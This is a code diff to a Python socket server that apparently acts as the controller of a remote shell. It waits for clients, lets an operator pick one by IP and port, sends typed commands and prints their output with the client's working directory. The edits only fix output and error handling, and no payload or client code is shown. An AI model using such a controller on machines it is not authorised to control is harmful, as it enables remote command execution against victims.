@@ -49,7 +49,10 @@ def handle_client(client_socket, addr):
                             output = payload.get("output", "")
                             current_directory = payload.get("current_directory", "~")
 
-                            print(output)
+                            if not output.endswith("\n"):
+                                output += "\n"
+
+                            print(output, end='')
 
                             with client_connections_lock:
                                 client_connections[addr]['current_directory'] = current_directory
@@ -66,21 +69,24 @@ def handle_client(client_socket, addr):
         print(f"[-] Connection from {addr[0]}:{addr[1]} closed.")
 
 def send_to_client(addr, command):
-    message = json.dumps({
-        "type": "command",
-        "payload": {"command": command}
-    }) + "\n"
-
-    with client_connections_lock:
-        client_socket = client_connections[addr]['socket']
-        response_event = client_connections[addr]['response_event']
-        response_event.clear()
-
     try:
-        client_socket.sendall(message.encode('utf-8'))
-        response_event.wait(timeout=30)
-    except Exception as e:
-        print(f"[!] Error sending command to {addr}: {e}")
+        message = json.dumps({
+            "type": "command",
+            "payload": {"command": command}
+        }) + "\n"
+
+        with client_connections_lock:
+            client_socket = client_connections[addr]['socket']
+            response_event = client_connections[addr]['response_event']
+            response_event.clear()
+
+        try:
+            client_socket.sendall(message.encode('utf-8'))
+            response_event.wait(timeout=30)
+        except Exception as e:
+            print(f"[!] Error sending command to {addr}: {e}")
+    except:
+        print(f"[!] {addr} is not connected.")
 
 def command_loop():
     print("[*] Waiting for clients to connect...")
@@ -100,14 +106,14 @@ def command_loop():
         target_port = int(input("Enter client port: ").strip())
         addr = (target_ip, target_port)
 
-        with client_connections_lock:
-            if addr not in client_connections:
-                print("[!] Client not connected.")
-                continue
-            current_directory = client_connections[addr]['current_directory']
-
         print(f"[+] Connected to {target_ip}:{target_port}. Type 'exit' to disconnect.")
         while True:
+            with client_connections_lock:
+                if addr not in client_connections:
+                    print("[!] Client not connected.")
+                    break
+                current_directory = client_connections[addr]['current_directory']
+
             command = input(f"{target_ip}:{current_directory}> ").strip()
 
             if command.lower() == "exit" or command.lower() == "quit" or command.lower() == "disconnect":
